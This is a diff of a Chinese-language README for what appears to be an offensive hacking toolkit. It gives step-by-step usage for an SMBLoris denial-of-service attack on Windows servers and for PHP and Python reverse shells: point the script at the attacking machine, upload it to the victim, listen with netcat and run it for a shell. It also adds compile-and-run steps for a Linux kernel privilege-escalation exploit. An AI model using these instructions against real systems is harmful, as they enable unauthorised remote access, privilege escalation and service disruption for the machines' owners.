@@ -10,7 +10,7 @@ shodancount.py weblogic
 
 shodansearch.py weblogic
 
-# SMBLoris 通过smb对Windows服务器实施DOS攻击
+# SMBLoris 通过smb服务对Windows服务器实施DOS攻击
 
 chmod +x run10.sh
 
@@ -32,26 +32,34 @@ sh password.sh
 
 # php-reverse-shell.php 一个基于php的反弹shell的脚本
 
-把php-reverse-shell.php中49行的地址改为自己的公网vps
+把php-reverse-shell.php中49行的地址改为攻击机器的地址
 
 上传该脚本到被攻击的机器上
 
-登录自己的公网vps，监听1234端口
+登录攻击机器，监听1234端口
 
 nc -lvp 1234
 
-在被攻击的机器上执行脚本，即可在vps上看到shell
+在被攻击的机器上执行脚本，即可在攻击机器上看到shell
 
 php php-reverse-shell.php
 
-# php-reverse-shell.py 一个基本python的反弹shell脚本
+# python-reverse-shell.py 一个基本python的反弹shell脚本
 
-在vps上监听端口，如1234
+在攻击机器上监听端口，如1234
 
 nc -lvp 1234
 
-把php-reverse-shell.py上传到被攻击的机器上,指定vps地址和端口执行即可
+把php-reverse-shell.py上传到被攻击的机器上,指定攻击机器地址和端口执行即可
 
 php-reverse-shell.py vps地址 1234
+
+# upstream44.c Ubuntu 16.04本地提权漏洞(CVE-2017-16995)
+
+编译执行即可
+
+gcc -o upstream44 upstream44.c
+
+sh upstream44
 
 # Hope you enjoy ^_^
